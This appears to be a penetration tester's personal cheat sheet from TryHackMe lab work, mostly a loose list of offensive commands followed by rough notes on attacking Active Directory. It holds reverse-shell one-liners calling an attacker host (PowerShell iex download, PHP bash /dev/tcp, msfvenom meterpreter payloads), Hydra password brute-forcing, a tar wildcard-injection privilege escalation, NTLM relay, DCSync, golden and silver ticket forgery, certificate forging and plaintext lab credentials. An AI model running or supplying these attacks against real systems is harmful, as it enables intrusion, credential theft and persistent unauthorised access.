sudo update-alternatives --config java
xfreerdp /v:THMWRK1.za.tryhackme.com /u:christine.hall /p:Randall19733333 -w <word list location>
copy file to ssh session(uplaod):
    scp antony.ross_dcdump.txt Administrator@10.200.61.248:file234.txt 
copy file from ssh session to local (download):
    scp -r Administrator@10.200.61.248:C:/Users/Administrator.ZA/jason.jackson_dcdump.txt .
    
    
    finding directories:
    gobuster dir -u http://<ip>:
meterpreter:
    migrate 720
    hashdump
enumerating samba shares:
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.190.22
    smbclient //<ip>/anonymous => to connect to smb share
    smbget -R smb://<ip>/anonymous

upload /home/mrbnf/Downloads/PowerSploit-master/Privesc/PowerUp.ps1
load powershell
powershell_shell
. .\PowerUp.ps1

sc stop AdvancedSystemCareService9
upload /home/mrbnf/Downloads/ASCService.exe
sc start AdvancedSystemCareService9

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.254.62 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=xFEfqR5%2FOOj%2BxpMB66aZKfUIIHNx9UH0ssc%2BOsno8FrS5zxo8F2FdQ2CbnDnlBVqvG7TNEFmir9ixqhvICPG5pI8IlMYtDggENahkIwMDOnZvSV9fbzHzZpqH9uy4j6wB5%2FzxlJ5PGDGUw2bGjYWiODOTcnRNehL74OgUe%2BXKCN4P3LH&__EVENTVALIDATION=QIXSUYR%2FV%2BWv3afc3T7e3F3NM5GkD%2BeTfAk2neeQoODpO1bPBDZ6%2FlhJAC5zM9jVioCSLDAtGkN6tmtIny0E4oG3CGvHpU41zCyRIU0utkUHltz1MubYunSyzL1XL%2FaXUQOHrOrnXI8ar1ddsY65GF9vF3%2BOVTo6kQy9El9zPh5oTOH%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.254.62:8080 http-post-form "/login?from=%2F:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"

powershell -c "Invoke-WebRequest -Uri 'http://10.8.25.229:9000/payload.exe' -Outfile ./shell.exe "


gobuster dir  -u http://10.10.101.165:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.25.229:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.25.229 -Port 5678

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.25.229 LPORT=4455 -f exe -o virus.exe
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.25.229:9000/virus.exe','virus.exe')"

whoami /priv
load incognito
list_tokens -g
mpersonate_token "BUILTIN\Administrators" 
SQLi:
' or 1=1 -- -
sqlmap -r request2.txt --dbms=mysql --dump
cracking password:
john /home/mrbnf/.msf4/loot/20221004111755_default_127.0.0.1_webmin.file_124645.bin
 --wordlist=/usr/share/wordlists/rockyou.txt --forma=Raw-SHA256

ss -tulpn => socket connection running

port forwarding:
ssh -L 10000:localhost:10000 agent47@10.10.240.42 => view service run in port 10000 in host 10.10.240.42 blocked from outside in localhost:10000

sudo rm -i /home/mrbnf/.john/john.rec 
set payload cmd/unix/reverse

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.55.100 http-post-form "/administrator/index.php:username=admin&passwd=^PASS^&option=com_login&task=login&return=aW5kZXgucGhw&6b31ee8df8b1a2940b4b522f84523942=1:Username and password do not match or you do not have an account yet."

python3  ‘import pty;pty.spawn(“/bin/bash”)’


printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh 
echo "" >  "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
/bin/bash -p

sqlmap -u "http://10.10.55.100/administrator/?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.25.229/1234 0>&1'");?>

hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

hydra -l admin -P /usr/share/wordlists/rockyou.txt http://127.0.0.1:6767 http-post-form "loginError:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 6767 -I http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password"


xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.146.172 /workarea

Buffer overflow:
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
625011BB

certutil -urlcache -f http://10.8.25.229:9000/winPEAS.bat winPEAS.bat


sudo nmap -T4 -p- -Pn 10.10.114.36

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.25.229 LPORT=443 -b "\x00\x0A" -f c -e x86/shikata_ga_nai

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.25.229 LPORT=443 -b "\x00\x0A" -f c -e x86/shikata_ga_nai

ls
!/bin/bash

show process use specific port
    netstat -ltnp | grep -w ':80' 
kill process use specific port 
    sudo ss --kill state listening src :1234


Windows fondamental:
    lusrmgr.msc => excute from run to show users and group
    search system configuration.
    computer management or compmgmt.msc
    msinfo32.exe or system information
    resmon or ressource monitor
    regedit or registry edit
Active directories: active directory are the network managed with the central domain controller
        active directories users and computers: to configure the above
            users
            machines
            groupes
        GPO groupe policies objects:
            are the policies for the architecture ,there are policies for all nodes or OU individually
        GPO distrubution: GPO is share in C:\Windows\SYSVOL\sysvol\ via network
            gpupdate /force => to force update GPO for all compute when it change 
        authentication:
            Kerberos: Used by any recent version of Windows. This is the default protocol in any recent domain.
            NetNTLM: Legacy authentication protocol kept for compatibility purposes.
        exploit or get credential :
                OSINT or phishing
                attacking NTLM : with brute force or spaying attack 
                LDAP: is authentication protocol like NTLM used for use printer ,ect
                            stole the hash to modify the server io to our ip 
                man in the middle : using Responder Tool to poisining LLMNR, NBT-NS, and WPAD
                        sudo responder -I tun0
                MDT and SCCM :  MDT used for automate the installation of OS ,SCCM manages all updates for all Microsoft
                                                                               applications, services, and operating systems
                                extract credential from the boot image PXE 
                configuration files
        enumerating AD after authenticate with credential gainned:
                credential injection (use credential captured to excute cmd like the user of credential): using runas.exe
                        runas.exe /netonly /user:za.tryhackme.com\kenneth.davies cmd.exe
                from GUI : microsoft management console (using RDP)
                Command Prompt: 
                    net user /domain => list all users of domain
                    net user zoe.marshall /domain => enemurate sing user acount
                    net group /domain => list groups of domain
                    net group "Tier 1 Admins" /domain => enumerate group
                    net accounts /domain => enumerate password policy
                 powershell
                 graph:  Bloodhound tools
        latteral movement: go to aother PC or try to connect it 
                spawning process remotely (using payloads) :
                    using tools :
                        Psexec:
                            psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
                        WinRM:
                            winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
                    remotly creating services using sc: create service 
                    Creating Scheduled Tasks Remotely
                Windows Management Instrumentation (WMI) for creating services and sheduled tasks or installing payloads
                extracting the hash using mimikatz (pass the hash): and used to connect using mimikatz,RDP,winrm,psexec.
                        SAM: the local user of host 
                        LSAS : local users and any domain user that has recently logged onto the machine.
                backdooring apps or programmes
                port forwarding :
                        remote 
                        local
                        tools :
                                SSH
                                SOCAT
                                
                                ssh tunneluser@10.50.61.101 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *
                                :7777:127.0.0.1:7777 -N
                                
                                netsh advfirewall firewall add rule name="Open Port 7777" dir=in action=allow protocol=TCP
                                 localport=7777

                    
                attacking active directories:
                        using misconfigration  (use bloodhound)
                        using delegation of apps or services
                        using user weekness (keylooger ,file not save and important ect):
                                $sudo /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.83.201 
                                              -c 'certutil.exe -urlcache -split -f http://10.50.81.117:9000/shell.ps1 shell.ps1 ' 
                                              -debug
                                sudo /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.83.201 
                                -c 'powershell.exe -noexit "& 'shell.ps1'"' -debug

                        using golden ticket
                persistence:the goool is all time can have acces to network against blue teem
                        through credential:
                                DC sync : when we have multiple DC must have the same data , we use a credential that can update data in the DCs and read all the hashes of credenials =>enable logging on Mimikatz
                                    log <username>_dcdump.txt 
                                    lsadump::dcsync /domain:za.tryhackme.loc /all
                        through tickets(hrough service accounts with delegation permissions ):
                                finding KRBTGT account  (like from DC sync)
                                Domain SID :
                                    Get-ADDomain (powershell)
                                generate golden ticket(spoof TGT) using mimikatz and inject to session
                                    kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
                                generate silver tickets (spoof TGS):
                                    kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
                                AD CS:
                                    Extracting the Private Key using mimikatz:
                                            crypto::certificates /systemstore:local_machine => from DC
                                            privilege::debug
                                            crypto::capi
                                            crypto::cng
                                            crypto::certificates /systemstore:local_machine /export => The exported certificates will be stored in both PFX and DER
                                            generate new certificate:
                                                C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
                                            request TGT with the new certificates:
                                                  C:\Tools\Rubeus.exe asktgt /u
ser:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password1
23 /outfile:newTGT.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
                                             load the TGT and authenticate to THMDC using mimikatz:
                                                    kerberos::ptt administrator.kirbi
                                 SID history: security identifier for user , add SID to SID history
                                         Get-ADUser <your ad username> -properties sidhistory,memberof => to show SID history of user                                                               
                                          Get-ADGroup "Domain Admins" => sid of groupe
                                          
                                          Stop-Service -Name ntds -force 
                                          Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
                                          Start-Service -Name ntds
                                 through Group Membership :add ourselves directly to AD group or Nested Groups (sub groupe)
                                 AD Group Templates (ACL gui): add our self as full control to groupe when updated every 60 min
                                 through Group Policy Objects (GPOs)
    credential harvesting( gaining access to user and system credentials):
            1-Credential Access : search for credential in files
                        Commands history:
                                C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
                        
                        Configuration files (Web App, FTP files, etc.)
                        Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
                        Backup files
                        Shared files and folders
                        Registry:
                                    reg query HKLM /f password /t REG_SZ /s
                        Source code 
                        Memory Dump:
                                Clear-text credentials
                                Cached passwords
                                AD Tickets
                        Password Managers:
                            Built-in password managers (Windows)
                            Third-party: KeePass, 1Password, LastPass
                        Active Directory
                        Network Sniffing:
                                MIM
             2-local windows credentials:Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory.
                        use Keylogger
                        Security Account Manager (SAM) :c:\Windows\System32\config\sam cannot read this file we use :
                                Metasploit's HashDump
                                Volume Shadow Copy Service
                                Registry Hives
                                
              3-LSASS process :Windows process that handles the operating system security policy
                        Dump lsass process
              4-Credentials Manager:Windows feature that stores logon-sensitive information
                        dump from it 
              Domain Controller:dump Domain Controller Hashes locally and remotely. C:\Windows\NTDS place of information dump from it
              5-LAPS feature (if it is active):
                    
              




        



